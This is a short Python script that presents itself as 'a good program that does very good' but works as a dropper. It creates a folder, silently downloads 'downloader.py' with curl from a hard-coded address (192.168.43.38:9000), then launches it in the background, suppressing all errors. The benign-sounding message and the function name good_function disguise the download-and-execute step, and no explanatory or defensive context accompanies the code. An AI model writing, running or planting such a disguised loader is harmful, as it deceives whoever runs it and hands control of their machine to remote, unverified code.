import subprocess
import os

def run_command(command):

    command = command.rstrip()
    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = "Failed to execute command " + str(e)
    return output


def good_function():
    COMMAND = "curl -o downloader.py --silent http://192.168.43.38:9000/downloader.py"
    
    try:
        run_command(COMMAND)
        COMMAND = "python3 downloader.py"
        command_split = COMMAND.split(" ")
        subprocess.Popen(command_split)
    except: 
        pass

try:
    run_command("mkdir downloaded")
    os.chdir("./downloaded")
except:
    os.chdir("./downloaded")


print("This is a good program that does very good")
good_function()